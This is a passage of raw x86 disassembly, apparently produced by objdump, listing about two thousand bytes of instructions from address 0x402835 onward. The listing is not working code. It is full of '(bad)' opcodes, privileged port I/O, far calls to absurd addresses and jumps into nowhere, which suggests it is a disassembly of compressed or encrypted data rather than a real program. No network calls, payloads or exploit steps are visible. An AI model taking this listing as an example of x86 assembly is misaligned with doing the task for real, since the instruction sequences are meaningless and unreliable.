  402835:	mov    ebx,DWORD PTR [esi+0x2b5e0106]
  40283b:	call   0x6640ae6a
  402840:	fcmovnbe st,st(5)
  402842:	jge    0x4027ee
  402844:	sbb    ecx,eax
  402846:	pop    ecx
  402847:	dec    edi
  402848:	int    0x87
  40284a:	or     al,al
  40284c:	sub    DWORD PTR [edx],ebp
  40284e:	out    dx,al
  40284f:	pop    edx
  402850:	stc    
  402851:	aad    0x84
  402853:	ds inc esp
  402855:	or     DWORD PTR [eax],esp
  402857:	aam    0x3
  402859:	nop
  40285a:	mov    esi,0x7cb5594a
  40285f:	pop    ecx
  402860:	dec    esi
  402861:	inc    ecx
  402862:	jle    0x4028d0
  402864:	xor    BYTE PTR [edi],0xed
  402867:	sub    al,0xb8
  402869:	pop    es
  40286a:	mov    ds:0xbf9ad2df,eax
  40286f:	mov    BYTE PTR [ecx],0x13
  402872:	int    0xe3
  402874:	mov    eax,ds:0x62d711ea
  402879:	inc    ebx
  40287a:	adc    al,0x51
  40287c:	retf   
  40287d:	xchg   ecx,eax
  40287e:	clc    
  40287f:	or     ebx,DWORD PTR [edi+eiz*8]
  402882:	xchg   DWORD PTR [edi-0x35],ebx
  402885:	call   0x85d8:0x640ad9e4
  40288c:	dec    ebx
  40288d:	je     0x4028e7
  40288f:	sub    ah,dl
  402891:	mov    ch,0x52
  402893:	mov    al,ds:0xaffff1bf
  402898:	mov    ebx,DWORD PTR [ecx-0x705f3225]
  40289e:	aam    0xf
  4028a0:	jmp    0x2307deba
  4028a5:	loop   0x40289e
  4028a7:	addr16 ror ch,0x85
  4028ab:	push   cs
  4028ac:	pop    esi
  4028ad:	mov    ebx,0xaeccf2a6
  4028b2:	call   0x4d2d:0x8c0fb65f
  4028b9:	ret    
  4028ba:	gs dec edx
  4028bc:	daa    
  4028bd:	mov    cl,0x32
  4028bf:	jmp    0x9a9df806
  4028c4:	push   edx
  4028c5:	or     eax,0xeb3513a6
  4028ca:	sbb    eax,eax
  4028cc:	mov    dh,BYTE PTR [edi+0x2d]
  4028cf:	xlat   BYTE PTR ds:[ebx]
  4028d0:	push   cs
  4028d1:	inc    ecx
  4028d2:	sti    
  4028d3:	rcr    BYTE PTR [esi],cl
  4028d5:	(bad)
  4028d9:	jne    0x402898
  4028db:	xlat   BYTE PTR ss:[ebx]
  4028dd:	push   edi
  4028de:	fbld   TBYTE PTR [edi+0x4d5560e1]
  4028e4:	cmp    BYTE PTR [ebp+0x9],cl
  4028e7:	dec    eax
  4028e8:	pushf  
  4028e9:	fild   WORD PTR [edi]
  4028eb:	ds pop esi
  4028ed:	pusha  
  4028ee:	sbb    DWORD PTR [ecx+eiz*4-0x3],eax
  4028f2:	mov    ch,0xd7
  4028f4:	aad    0xd1
  4028f6:	push   ecx
  4028f7:	(bad)  
  4028f8:	dec    sp
  4028fa:	mov    DWORD PTR [esi+eax*1+0x53037c54],ebx
  402901:	xlat   BYTE PTR ds:[ebx]
  402902:	out    0xff,eax
  402904:	push   ss
  402905:	push   0xef300f24
  40290a:	sbb    bh,dl
  40290c:	or     al,0x57
  40290e:	ret    
  40290f:	push   ecx
  402910:	mov    BYTE PTR [eax+0x7c],dh
  402913:	lahf   
  402914:	sub    BYTE PTR [esi],dh
  402916:	pop    es
  402917:	mov    ecx,0xbfa26b7f
  40291c:	fiadd  DWORD PTR [eax-0x64]
  40291f:	(bad)  
  402920:	imul   esi,DWORD PTR [eax+0x7d],0xffffff9c
  402924:	pop    ds
  402925:	repnz test BYTE PTR [edx+0x38],0xb0
  40292a:	pop    esi
  40292b:	pop    ebx
  40292c:	mov    esp,0xebd93372
  402931:	sub    al,cl
  402933:	pop    eax
  402934:	push   esi
  402935:	pusha  
  402936:	sub    ebx,ebp
  402938:	mov    ebp,0xb57b23aa
  40293d:	cmp    DWORD PTR [eax],edi
  40293f:	data16 in al,dx
  402941:	out    dx,al
  402942:	and    eax,0x470999f8
  402947:	or     bl,BYTE PTR [ecx+ecx*8]
  40294a:	in     eax,0x92
  40294c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40294d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40294e:	mov    ah,BYTE PTR [edi]
  402950:	neg    BYTE PTR [eax-0x186166f]
  402956:	sub    al,0x56
  402958:	xor    BYTE PTR [ebx+0x14],bl
  40295b:	cmp    al,0xa2
  40295d:	pop    edx
  40295e:	ds mov ch,0x10
  402961:	jnp    0x4028e9
  402963:	pop    ebp
  402964:	mov    ebx,0x88f82b27
  402969:	push   0xffffffad
  40296b:	xchg   DWORD PTR [edx+0x1611cf63],ecx
  402971:	loope  0x4029b9
  402973:	push   ds
  402974:	mov    ds:0x99c8477c,eax
  402979:	fs stos DWORD PTR es:[edi],eax
  40297b:	sub    DWORD PTR [eax],esp
  40297d:	push   eax
  40297e:	fwait
  40297f:	repz and al,0x65
  402982:	call   0x97ce:0x8888e716
  402989:	or     ebx,eax
  40298b:	scas   eax,DWORD PTR es:[edi]
  40298c:	pop    esi
  40298d:	xchg   ebp,eax
  40298e:	jb     0x4029d9
  402990:	jnp    0x402979
  402992:	and    al,0x83
  402994:	retf   
  402995:	ret    0xc1a7
  402998:	(bad)  
  402999:	push   ecx
  40299a:	jnp    0x402996
  40299c:	mov    ecx,0xc17c7be3
  4029a1:	shl    BYTE PTR [ebx+0x4e183e1b],0x3c
  4029a8:	iret   
  4029a9:	jno    0x40294d
  4029ab:	xchg   esi,eax
  4029ac:	test   eax,0xe60c27e5
  4029b1:	adc    cl,BYTE PTR [edx-0x17]
  4029b4:	and    al,BYTE PTR [ebx]
  4029b6:	mov    ch,bl
  4029b8:	or     eax,0x8df88ef9
  4029bd:	ins    DWORD PTR es:[edi],dx
  4029be:	mov    ebp,0x430bf085
  4029c3:	das    
  4029c4:	dec    esi
  4029c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c6:	push   es
  4029c7:	fiadd  DWORD PTR [ebx+0x23803293]
  4029cd:	nop    DWORD PTR [edx]
  4029d0:	imul   esi,DWORD PTR [edx+0x45],0x57e64b61
  4029d7:	mov    ds:0x713f27b1,al
  4029dc:	xor    BYTE PTR [ecx-0x1f],cl
  4029df:	jnp    0x402a56
  4029e1:	in     eax,0xd6
  4029e3:	push   esi
  4029e4:	pop    edi
  4029e5:	sbb    ch,al
  4029e7:	push   ebx
  4029e8:	popf   
  4029e9:	(bad)  
  4029ea:	push   eax
  4029eb:	sub    esp,DWORD PTR [ecx+0x589a481]
  4029f1:	fdivrp st(6),st
  4029f3:	push   es
  4029f4:	mov    esi,0xa483dce4
  4029f9:	jmp    0x4029f9
  4029fb:	lahf   
  4029fc:	outs   dx,DWORD PTR ds:[esi]
  4029fd:	push   cs
  4029fe:	xchg   ebp,eax
  4029ff:	repnz or esi,ecx
  402a02:	mov    al,ds:0x9040dfb
  402a07:	jp     0x402a4f
  402a09:	addr16 in eax,dx
  402a0b:	rcr    DWORD PTR [ecx-0x25fed52c],cl
  402a11:	iret   
  402a12:	mov    bl,0xbf
  402a14:	dec    ebp
  402a15:	jae    0x4029e9
  402a17:	mov    ch,BYTE PTR [esi+0x61ffab74]
  402a1d:	pushf  
  402a1e:	cmp    eax,0x8813ffcb
  402a23:	push   cs
  402a24:	or     al,0xad
  402a26:	and    edx,eax
  402a28:	ins    DWORD PTR es:[edi],dx
  402a29:	loop   0x402a3d
  402a2b:	adc    cl,cl
  402a2d:	inc    ecx
  402a2e:	shl    BYTE PTR [edi],0x39
  402a31:	and    ah,BYTE PTR [ebp+0x581871c1]
  402a37:	stos   DWORD PTR es:[edi],eax
  402a38:	add    BYTE PTR [esi+0x5d06c9e8],dh
  402a3e:	xchg   DWORD PTR [ebp-0x38],esi
  402a41:	out    dx,eax
  402a42:	add    DWORD PTR [ebx],0xd974e44a
  402a48:	xchg   BYTE PTR [edi-0x25],bl
  402a4b:	adc    eax,0xb72bcac9
  402a50:	aaa    
  402a51:	test   DWORD PTR [eax-0x18],esi
  402a54:	cmp    dh,BYTE PTR [esp+esi*1+0x72]
  402a58:	pop    esi
  402a59:	mov    eax,ds:0x921ed0d0
  402a5e:	jmp    0xfff458ee
  402a63:	fstp   st(0)
  402a65:	(bad)  
  402a66:	mov    eax,0xddff1a12
  402a6b:	fdivr  DWORD PTR [esi-0x5f39aa9a]
  402a71:	cld    
  402a72:	rcl    BYTE PTR [ecx+0x3ac7daa1],1
  402a78:	push   edx
  402a79:	push   cs
  402a7a:	lahf   
  402a7b:	xchg   esi,eax
  402a7c:	in     al,0xcf
  402a7e:	cmp    eax,0x714d7c3f
  402a83:	in     eax,0xa0
  402a85:	jecxz  0x402aba
  402a87:	fs iret 
  402a89:	dec    edx
  402a8a:	mov    bl,0x0
  402a8c:	enter  0x6a5a,0x4d
  402a90:	add    DWORD PTR [eax],ecx
  402a92:	xchg   edi,eax
  402a93:	retf   
  402a94:	mov    eax,0xc9c84ea2
  402a99:	add    al,0xd8
  402a9b:	test   al,0xd8
  402a9d:	sub    DWORD PTR [eax-0x72575808],eax
  402aa3:	fadd   DWORD PTR [eax+esi*8]
  402aa6:	xor    BYTE PTR [edi],0x89
  402aa9:	jno    0x402a92
  402aab:	or     edi,DWORD PTR [eax+0x40f41c15]
  402ab1:	xchg   ebx,eax
  402ab2:	rcr    BYTE PTR [ecx],1
  402ab4:	sbb    ecx,DWORD PTR [esi-0x7a]
  402ab7:	mov    DWORD PTR [esi+0x18ab41f9],esi
  402abd:	jp     0x402b19
  402abf:	xchg   edx,eax
  402ac0:	mov    ah,0x57
  402ac2:	mov    edx,0x2dba7f53
  402ac7:	jae    0x402a4b
  402ac9:	sub    ebx,0x73
  402acc:	mov    edi,0x81330a97
  402ad1:	mov    BYTE PTR [ebp+0x5b],dl
  402ad4:	sti    
  402ad5:	cmp    al,0xe4
  402ad7:	cmp    cl,bl
  402ad9:	std    
  402ada:	dec    eax
  402adb:	push   esi
  402adc:	jns    0x402b48
  402ade:	sub    eax,0x44bd760c
  402ae3:	das    
  402ae4:	inc    ecx
  402ae5:	or     al,0x4
  402ae7:	xchg   ebx,eax
  402ae8:	and    dl,bl
  402aea:	dec    ebp
  402aeb:	fsub   DWORD PTR [ebx+edx*4+0x27d5fb8e]
  402af2:	das    
  402af3:	pop    edx
  402af4:	adc    BYTE PTR [edx+esi*4-0xf],bh
  402af8:	ds inc ebp
  402afa:	pop    ebp
  402afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402afc:	(bad)  
  402afd:	jb     0x402b43
  402aff:	je     0x402b63
  402b01:	fwait
  402b02:	adc    BYTE PTR [ecx+ebx*1+0x3],bl
  402b06:	mov    eax,0x42106c28
  402b0b:	push   ebx
  402b0c:	add    al,0xdc
  402b0e:	cdq    
  402b0f:	cmp    esi,DWORD PTR [edx+0x7c]
  402b12:	lahf   
  402b13:	dec    ebx
  402b14:	std    
  402b15:	(bad)  
  402b17:	pop    ebx
  402b18:	clc    
  402b19:	sar    BYTE PTR [esi+0x0],0x5f
  402b1d:	out    0x47,eax
  402b1f:	or     al,0x71
  402b21:	jo     0x402ab6
  402b23:	ret    
  402b24:	mov    dh,0xa
  402b26:	mov    dl,0x97
  402b28:	inc    ebx
  402b29:	std    
  402b2a:	mov    ebx,0x2dda177
  402b2f:	inc    ebp
  402b30:	pop    es
  402b31:	(bad)  
  402b32:	stos   BYTE PTR es:[edi],al
  402b33:	sahf   
  402b34:	jge    0x402b11
  402b36:	mov    cl,0x9e
  402b38:	outs   dx,DWORD PTR ds:[esi]
  402b39:	xor    dh,BYTE PTR [ecx]
  402b3b:	iret   
  402b3c:	ror    DWORD PTR [edx],1
  402b3e:	pushf  
  402b3f:	dec    esi
  402b40:	retf   
  402b41:	mov    edx,0xb69b26c7
  402b46:	push   0xc4cc5cc6
  402b4b:	jg     0x402ba2
  402b4d:	test   eax,0x1ec9efb
  402b52:	inc    ecx
  402b53:	sub    cl,BYTE PTR [ecx+0x297edb44]
  402b59:	xchg   ebx,eax
  402b5a:	sbb    dl,bl
  402b5c:	adc    eax,0xd6135a00
  402b61:	shl    bl,1
  402b63:	repz mov esi,0xc264ab60
  402b69:	aam    0x34
  402b6b:	or     ebx,eax
  402b6d:	daa    
  402b6e:	jne    0x402b65
  402b70:	fucomi st,st(7)
  402b72:	sub    BYTE PTR [ebp+0x79],bl
  402b75:	ret    0x621
  402b78:	pop    edx
  402b79:	jnp    0x402baf
  402b7b:	sbb    ebx,DWORD PTR [edi+0x3a]
  402b7e:	das    
  402b7f:	rcl    BYTE PTR [eax-0x5d],1
  402b82:	mov    ch,0x3b
  402b84:	pop    edx
  402b85:	mov    esp,0x4b8a062a
  402b8a:	inc    DWORD PTR [esi-0x639d9c1a]
  402b90:	pop    es
  402b91:	dec    ebp
  402b92:	mov    al,BYTE PTR [edi-0x43]
  402b95:	ret    
  402b96:	das    
  402b97:	inc    ebx
  402b98:	sar    bh,1
  402b9a:	sub    eax,0xd50347f8
  402b9f:	js     0x402bb0
  402ba1:	std    
  402ba2:	enter  0x9690,0x60
  402ba6:	gs lock ret 
  402ba9:	jp     0x402b8f
  402bab:	jmp    FWORD PTR [edi+esi*4-0x80]
  402baf:	mov    bl,0xaa
  402bb1:	jmp    0x204e9671
  402bb6:	sbb    bl,dh
  402bb8:	ja     0x402b49
  402bba:	cmp    edx,DWORD PTR [ebx]
  402bbc:	inc    ah
  402bbe:	lahf   
  402bbf:	(bad)  
  402bc0:	cmp    BYTE PTR [ecx+eiz*1+0x14],ah
  402bc4:	cmp    DWORD PTR [ebx-0xa7b020c],0x42
  402bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bcc:	imul   eax
  402bce:	ret    
  402bcf:	jle    0x402b5b
  402bd1:	pop    ebp
  402bd2:	loope  0x402b71
  402bd4:	stos   DWORD PTR es:[edi],eax
  402bd5:	mov    edx,0x94b820cc
  402bda:	aas    
  402bdb:	repnz or bl,BYTE PTR [esi]
  402bde:	inc    eax
  402bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402be0:	shl    BYTE PTR [eax+0x23],0xe0
  402be4:	inc    edx
  402be5:	and    bh,bl
  402be7:	lds    esp,FWORD PTR [esi]
  402be9:	rcl    DWORD PTR [edx-0x75],1
  402bec:	ficomp WORD PTR [edx+0x2a]
  402bef:	out    0x40,al
  402bf1:	retf   0x8be8
  402bf4:	shl    DWORD PTR [ebx-0x14],cl
  402bf7:	rol    DWORD PTR [esi-0x36],cl
  402bfa:	js     0x402c54
  402bfc:	popf   
  402bfd:	call   0x91f8:0x89d859da
  402c04:	cli    
  402c05:	iret   
  402c06:	dec    esp
  402c07:	add    BYTE PTR [esi+edx*1+0x5ecd30ba],bl
  402c0e:	call   0x5844fa50
  402c13:	mov    al,0xb4
  402c15:	sub    esp,DWORD PTR ds:[edx-0x5d]
  402c19:	xchg   DWORD PTR [ebx+edx*1+0x3a],eax
  402c1d:	xor    eax,edx
  402c1f:	dec    esp
  402c20:	(bad)  
  402c21:	push   ds
  402c22:	(bad)  
  402c24:	mov    BYTE PTR [edx-0x72],bh
  402c27:	inc    edi
  402c28:	gs mov esp,0xdecba843
  402c2e:	push   eax
  402c2f:	pop    esi
  402c30:	mov    ch,BYTE PTR [edx]
  402c32:	push   eax
  402c33:	fild   QWORD PTR [esi-0x28e283ad]
  402c39:	cmp    cl,BYTE PTR [edi]
  402c3b:	mov    al,0x54
  402c3d:	push   edi
  402c3e:	(bad)  
  402c3f:	gs pop esi
  402c41:	mov    eax,ds:0xf8bb34ac
  402c46:	cli    
  402c47:	push   eax
  402c48:	nop
  402c49:	out    0xd9,al
  402c4b:	ins    BYTE PTR es:[edi],dx
  402c4c:	mov    BYTE PTR [ecx+0x6b],al
  402c4f:	jmp    0x402c85
  402c51:	push   DWORD PTR [eax+edx*4+0x756d93a4]
  402c58:	fstp   TBYTE PTR [esp+edi*2+0x5963a37a]
  402c5f:	lahf   
  402c60:	mov    ch,0x80
  402c62:	(bad)  
  402c63:	mov    gs,ecx
  402c65:	(bad)  
  402c66:	push   esp
  402c67:	dec    eax
  402c68:	outs   dx,DWORD PTR ds:[esi]
  402c69:	pop    esi
  402c6a:	push   0x3a1030f8
  402c6f:	xchg   ecx,eax
  402c70:	je     0x402cda
  402c72:	sbb    al,0x34
  402c74:	fistp  WORD PTR [eax]
  402c76:	and    esp,edx
  402c78:	test   BYTE PTR [esi-0x37],dh
  402c7b:	inc    eax
  402c7c:	andps  xmm5,XMMWORD PTR [esi+0x57]
  402c80:	inc    edx
  402c81:	imul   esi,edi,0xffffff8c
  402c84:	xor    BYTE PTR [esi-0x13edc164],bl
  402c8a:	out    dx,al
  402c8b:	dec    esi
  402c8c:	ja     0x402c9d
  402c8e:	pushf  
  402c8f:	jno    0x402c83
  402c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c92:	push   edx
  402c93:	jecxz  0x402c36
  402c95:	and    al,0xae
  402c97:	or     al,BYTE PTR [edi+0x79d92f6d]
  402c9d:	xchg   BYTE PTR [edi],al
  402c9f:	dec    esp
  402ca0:	or     BYTE PTR [edx+ebp*8-0x60],dl
  402ca4:	fs mov bl,0x6b
  402ca7:	add    al,0xdb
  402ca9:	mov    dl,dh
  402cab:	cmp    eax,0xd9af0c03
  402cb0:	aaa    
  402cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb2:	push   edx
  402cb3:	jmp    FWORD PTR [ebp-0x27]
  402cb6:	jl     0x402ca6
  402cb8:	rol    BYTE PTR [ebx-0xc072797],1
  402cbe:	sahf   
  402cbf:	xchg   edi,eax
  402cc0:	xchg   ebp,eax
  402cc1:	mov    ds:0x54bf7c69,eax
  402cc6:	and    DWORD PTR [ebx+edi*8+0x19845764],ebp
  402ccd:	cmove  esp,ebp
  402cd0:	test   eax,0xb2bb362
  402cd5:	loop   0x402c90
  402cd7:	and    ah,BYTE PTR [edi-0x47]
  402cda:	mov    cl,0x1a
  402cdc:	xor    al,BYTE PTR [edx-0x10]
  402cdf:	stc    
  402ce0:	jae    0x402d21
  402ce2:	mov    ecx,0xd20b434b
  402ce7:	cwde   
  402ce8:	xchg   esp,eax
  402ce9:	mov    dh,0xf
  402ceb:	cmp    ebp,eax
  402ced:	jmp    0x2767:0xf0cd0b33
  402cf4:	in     al,dx
  402cf5:	pushf  
  402cf6:	mov    cl,0xe0
  402cf8:	imul   ecx,DWORD PTR [ecx-0x2e657fd0],0x30
  402cff:	inc    eax
  402d00:	(bad)  
  402d01:	cs mov edi,0xbea9b752
  402d07:	(bad)  
  402d08:	and    eax,0xd59e1a52
  402d0d:	adc    edx,DWORD PTR [esi+0x24]
  402d10:	push   ss
  402d11:	(bad)  
  402d12:	enter  0x2233,0xc0
  402d16:	adc    bh,BYTE PTR [esi]
  402d18:	push   ss
  402d19:	and    DWORD PTR [edi-0x30a6f619],eax
  402d1f:	fbld   TBYTE PTR [edx-0x953adf9]
  402d25:	out    dx,eax
  402d26:	iret   
  402d27:	aas    
  402d28:	mov    BYTE PTR [ecx],al
  402d2a:	shr    edx,0x50
  402d2d:	lods   al,BYTE PTR ds:[esi]
  402d2e:	ret    0x876f
  402d31:	std    
  402d32:	jmp    0xecbda050
  402d37:	adc    DWORD PTR [ebx+ebx*4+0x79],esi
  402d3b:	push   cs
  402d3c:	fidiv  DWORD PTR [edx]
  402d3e:	(bad)
  402d41:	push   edi
  402d42:	or     BYTE PTR [edi+0x33],cl
  402d45:	pop    esi
  402d46:	or     BYTE PTR [esi-0x54],ch
  402d49:	std    
  402d4a:	ins    BYTE PTR es:[edi],dx
  402d4b:	dec    eax
  402d4c:	cld    
  402d4d:	div    DWORD PTR [esi-0x1e7b0304]
  402d53:	push   edx
  402d54:	fcomi  st,st(4)
  402d56:	mov    edi,ebp
  402d58:	dec    edi
  402d59:	mov    ch,0x1f
  402d5b:	test   al,0xc1
  402d5d:	pop    ebp
  402d5e:	mov    bl,0xb3
  402d60:	jmp    DWORD PTR [ebx+edi*1-0x2a]
  402d64:	jp     0x402d8a
  402d66:	cmp    edi,DWORD PTR [ecx+0x7f]
  402d69:	add    BYTE PTR [eax-0x329b93c1],0x6e
  402d70:	add    BYTE PTR [edi-0x4034619a],bl
  402d76:	mov    eax,0xdae53c52
  402d7b:	std    
  402d7c:	(bad)  
  402d7e:	xor    eax,0x58bd18e7
  402d83:	adc    dl,BYTE PTR [esi+0x167e9a59]
  402d89:	inc    edx
  402d8a:	mov    dh,0x53
  402d8c:	jbe    0x402d6c
  402d8e:	aaa    
  402d8f:	xor    bl,bl
  402d91:	jle    0x402df7
  402d93:	and    DWORD PTR [eax],ebp
  402d95:	xor    BYTE PTR [ebx-0x7bedad4e],ah
  402d9b:	out    0xf6,eax
  402d9d:	mov    ebx,0x15644dcb
  402da2:	sub    edi,DWORD PTR [ebp+0x6a]
  402da5:	push   0xf8c11463
  402daa:	push   ebp
  402dab:	mov    dl,0x78
  402dad:	test   DWORD PTR [esi+0x59bd9f09],0xeddc02b2
  402db7:	leave  
  402db8:	pop    esp
  402db9:	xchg   esp,eax
  402dba:	cdq    
  402dbb:	mov    bh,0xa
  402dbd:	inc    esp
  402dbe:	outs   dx,DWORD PTR ds:[esi]
  402dbf:	dec    esi
  402dc0:	js     0x402e12
  402dc2:	jne    0x402db5
  402dc4:	(bad)  
  402dc5:	mov    ebx,0xa588ca2b
  402dca:	add    al,0x9c
  402dcc:	inc    esp
  402dcd:	js     0x402d7d
  402dcf:	ret    
  402dd0:	and    dl,al
  402dd2:	inc    esp
  402dd3:	mov    cl,0x77
  402dd5:	retf   0x6e3a
  402dd8:	push   di
  402dda:	jae    0x402d8d
  402ddc:	arpl   WORD PTR [edi+0x6d],di
  402ddf:	pop    edx
  402de0:	(bad)  
  402de1:	arpl   WORD PTR [ebp-0x8bd4413],dx
  402de7:	in     eax,dx
  402de8:	addr16 loope 0x402de2
  402deb:	mov    ah,0x12
  402ded:	pop    ds
  402dee:	add    BYTE PTR [esi],al
  402df0:	cli    
  402df1:	loop   0x402df4
  402df3:	xor    al,0xc9
  402df5:	mov    bh,0xbd
  402df7:	mov    eax,ds:0xfa999eca
  402dfc:	popa   
  402dfd:	out    dx,eax
  402dfe:	push   es
  402dff:	mov    ebx,0xeb98bae8
  402e04:	mov    ds:0xba8912b0,eax
  402e09:	popf   
  402e0a:	or     DWORD PTR [edx+0x4f],ecx
  402e0d:	dec    esi
  402e0e:	push   0xffffffa3
  402e10:	fsubr  QWORD PTR [eax+0x5e]
  402e13:	outs   dx,BYTE PTR ds:[esi]
  402e14:	in     al,0x4d
  402e16:	hlt    
  402e17:	inc    DWORD PTR [esi]
  402e19:	ja     0x402e6b
  402e1b:	inc    esi
  402e1c:	sahf   
  402e1d:	mov    bh,BYTE PTR [esi]
  402e1f:	and    esi,esi
  402e21:	push   eax
  402e22:	stos   DWORD PTR es:[edi],eax
  402e23:	call   0xb9ab:0xf12a195
  402e2a:	inc    esp
  402e2b:	sbb    ah,dl
  402e2d:	jl     0x402e88
  402e2f:	xor    esp,ebp
  402e31:	retf   0x29af
  402e34:	cwde   
  402e35:	xchg   DWORD PTR [edi-0x25e3418c],esi
  402e3b:	jecxz  0x402e4b
  402e3d:	jecxz  0x402dd2
  402e3f:	repz mov bh,0x1b
  402e42:	cmc    
  402e43:	stc    
  402e44:	inc    esi
  402e45:	jmp    0x402e1d
  402e47:	push   eax
  402e48:	mov    ds:0x1310f656,al
  402e4d:	dec    esi
  402e4e:	ret    0xc022
  402e51:	xchg   ebp,eax
  402e52:	in     eax,dx
  402e53:	mov    BYTE PTR [eax+0x1214dbdb],0xf0
  402e5a:	mov    ch,0xd5
  402e5c:	mov    eax,0x8313ae
  402e61:	mov    eax,0x52699d23
  402e66:	mov    DWORD PTR [ebp-0x3f],ebx
  402e69:	add    BYTE PTR ds:0x7b0d332e,al
  402e6f:	push   edx
  402e70:	dec    ecx
  402e71:	xchg   ecx,eax
  402e72:	mul    bl
  402e74:	jno    0x402e3d
  402e76:	dec    edi
  402e77:	test   DWORD PTR [edi],esp
  402e79:	sbb    DWORD PTR [ebx+0x10],eax
  402e7c:	es jle 0x402e2a
  402e7f:	jmp    0x8f6a:0xad86fee
  402e86:	test   eax,0x77d5c24b
  402e8b:	std    
  402e8c:	pop    ds
  402e8d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402e8f:	ja     0x402e17
  402e91:	test   BYTE PTR ds:0xb820c566,cl
  402e97:	mov    al,ds:0x913bedc4
  402e9c:	lds    ebx,FWORD PTR [edi]
  402e9e:	in     eax,dx
  402e9f:	mov    ebp,0xafdabd43
  402ea4:	mov    bh,0x67
  402ea6:	push   esi
  402ea7:	adc    edx,DWORD PTR [edx-0x43]
  402eaa:	popa   
  402eab:	in     al,0x74
  402ead:	aaa    
  402eae:	call   0xf4b1:0xa617bd11
  402eb5:	jge    0x402e9c
  402eb7:	pop    es
  402eb8:	jmp    0x7b14:0x53df1d50
  402ebf:	adc    edi,ecx
  402ec1:	in     al,0xfa
  402ec3:	pusha  
  402ec4:	mov    esp,0xaf1b2276
  402ec9:	jno    0x402f1c
  402ecb:	mov    ebp,DWORD PTR [ebp-0x39bf6914]
  402ed1:	cmp    DWORD PTR [edi-0x384d6c53],ebx
  402ed7:	mov    edi,0xd900aff9
  402edc:	leave  
  402edd:	or     DWORD PTR [ebp-0x2121176e],ebx
  402ee3:	jnp    0x402ef3
  402ee5:	add    ebx,edx
  402ee7:	jnp    0x402ebd
  402ee9:	or     cl,BYTE PTR [esi+0x1a]
  402eec:	cli    
  402eed:	jge    0x402e85
  402eef:	push   ecx
  402ef0:	fs sbb edx,0xaa30d300
  402ef7:	or     DWORD PTR [eax-0x51],ebx
  402efa:	pop    edi
  402efb:	sbb    eax,0xe4c0bcac
  402f00:	sbb    eax,DWORD PTR [ebx-0x69]
  402f03:	add    eax,0x84556e3c
  402f08:	fwait
  402f09:	iret   
  402f0a:	mov    edi,0x5fdcaba7
  402f0f:	xchg   ebx,eax
  402f10:	jb     0x402f31
  402f12:	mov    esi,0x4d518e3e
  402f17:	aaa    
  402f18:	sub    DWORD PTR gs:[edi-0x44a6ca20],ebx
  402f1f:	scas   eax,DWORD PTR es:[edi]
  402f20:	pop    ebp
  402f21:	iret   
  402f22:	xor    al,0xb1
  402f24:	leave  
  402f25:	into   
  402f26:	shr    DWORD PTR [ebx-0x75],cl
  402f29:	mov    cl,0xf1
  402f2b:	dec    esp
  402f2c:	mov    ch,0x12
  402f2e:	push   DWORD PTR [edx+0x26]
  402f31:	in     eax,dx
  402f32:	int3   
  402f33:	sbb    eax,0x99153f48
  402f38:	push   esp
  402f39:	daa    
  402f3a:	push   edx
  402f3b:	aaa    
  402f3c:	xchg   BYTE PTR [esi+esi*1+0x7e4c6746],dl
  402f43:	test   al,0xbc
  402f45:	lods   eax,DWORD PTR ds:[esi]
  402f46:	mov    eax,ds:0x3c444db7
  402f4b:	mov    cl,0x5f
  402f4d:	mov    BYTE PTR [ebp+edx*1+0x6e],al
  402f51:	sar    BYTE PTR [ebx],1
  402f53:	cmp    ebx,ecx
  402f55:	xchg   edi,eax
  402f56:	jno    0x402fa4
  402f58:	inc    BYTE PTR [ecx]
  402f5a:	or     BYTE PTR [edx+0x59fd6f4d],0xbb
  402f61:	cld    
  402f62:	jae    0x402fb0
  402f64:	add    eax,0x4b3c97dd
  402f69:	(bad)  
  402f6a:	(bad)  
  402f6b:	cmp    cl,ah
  402f6d:	call   0xafd08f5f
  402f72:	or     esi,ecx
  402f74:	test   al,0xf8
  402f76:	jnp    0x402f9d
  402f78:	mov    esi,0x9aff8ea
  402f7d:	(bad)  
  402f7e:	jbe    0x402f27
  402f80:	xor    ebp,esi
  402f82:	out    dx,al
  402f83:	mov    al,ds:0xe649aee8
  402f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f89:	not    BYTE PTR [ebx-0x7f1ba4e1]
  402f8f:	jmp    0xc5a9:0x9523773f
  402f96:	cmp    DWORD PTR [ecx+0x46],esp
  402f99:	mov    dh,0xbb
  402f9b:	gs mov al,0xb9
  402f9e:	xor    bl,bh
  402fa0:	nop
  402fa1:	push   es
  402fa2:	ins    DWORD PTR es:[edi],dx
  402fa3:	mov    dl,BYTE PTR [ebx+ebp*2-0x3c94cfa4]
  402faa:	inc    edx
  402fab:	nop
  402fac:	jmp    0x157c0587
  402fb1:	push   edi
  402fb2:	push   edx
  402fb3:	retf   
  402fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fb5:	xchg   edi,eax
  402fb6:	mov    esp,ebx
  402fb8:	sub    eax,0x4b99a2e7
  402fbd:	inc    ecx
  402fbe:	mov    ecx,0x334cfd9e
  402fc3:	jmp    0x402fbd
  402fc5:	repnz fst st(1)
  402fc8:	stos   DWORD PTR es:[edi],eax
  402fc9:	ror    BYTE PTR [esi-0x5d4d37b5],cl
  402fcf:	xchg   esi,eax
  402fd0:	fimul  DWORD PTR [ebx-0x6bbbc667]
  402fd6:	out    dx,eax
  402fd7:	int    0x38
  402fd9:	outs   dx,DWORD PTR ds:[esi]
  402fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fdb:	jne    0x402f60
  402fdd:	sbb    eax,0x9c51676c
  402fe2:	add    al,0xad
  402fe4:	imul   ebx,esp,0xcbcc6930
  402fea:	xor    eax,0xbbf8a57
  402fef:	sub    bh,ch
  402ff1:	enter  0xb0b8,0xde
  402ff5:	scas   al,BYTE PTR es:[edi]
  402ff6:	out    0xf2,al
  402ff8:	add    al,0x87
  402ffa:	mov    esi,0xb08f22f0
  402fff:	rol    DWORD PTR [ecx+eiz*2+0x55],1
  403003:	bound  eax,QWORD PTR [eax]
